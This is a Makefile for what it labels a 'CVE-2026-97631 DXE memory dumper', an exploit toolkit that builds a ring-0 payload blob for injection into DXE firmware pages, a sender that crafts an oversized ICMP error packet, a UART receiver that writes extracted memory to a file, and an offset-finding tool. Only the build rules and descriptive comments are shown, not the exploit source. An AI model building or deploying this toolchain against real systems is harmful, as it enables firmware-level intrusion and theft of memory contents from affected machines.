# Makefile - CVE-2026-97631 DXE memory dumper
#
# Targets
#   payload.bin   position-independent ring-0 blob, .rodata-ready
#   pxeinj        sender (crafts the oversized ICMP error)
#   pxerecv       UART sink -> extraction file
#   fw_offsets    parses a debug firmware map to produce real graft offsets
#
# Cross usage (Linux host, gcc + binutils) is the normal case:
#   make payload.bin CC=gcc LD=ld OBJCOPY=objcopy

CC      ?= gcc
LD      ?= ld
OBJCOPY ?= objcopy
CFLAGS  ?= -O2 -Wall -Wextra -Wno-unused-parameter -std=c11
CFLAGS  += -Iinclude -D_GNU_SOURCE
LDFLAGS ?=

BIN := build

all: $(BIN)/payload.bin $(BIN)/pxeinj $(BIN)/pxerecv $(BIN)/fw_offsets

$(BIN):
	@mkdir -p $(BIN)

# ---- ring-0 blob -----------------------------------------------------------
# Assembled, linked at 0, then only .text extracted: no headers, no relocs,
# no padding.  The result drops anywhere in DXE code or data pages.
$(BIN)/payload.o: src/payload.S | $(BIN)
	$(CC) -c -nostdlib -fPIC -o $@ $<

$(BIN)/payload.elf: $(BIN)/payload.o
	$(LD) -Ttext=0 -e payload_start --oformat elf64-x86-64 -o $@ $<

$(BIN)/payload.bin: $(BIN)/payload.elf
	$(OBJCOPY) -O binary --only-section=.text $< $@
	@echo "payload size: $$(wc -c < $@) bytes"

# ---- host tools ------------------------------------------------------------
$(BIN)/pxeinj: src/main.c src/craft.c src/graft.c src/uart.c | $(BIN)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

$(BIN)/pxerecv: src/recv.c src/uart.c | $(BIN)
	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)

$(BIN)/fw_offsets: tools/fw_offsets.py
	@cp $< $@ && chmod +x $@

clean:
	rm -rf $(BIN)

.PHONY: all clean
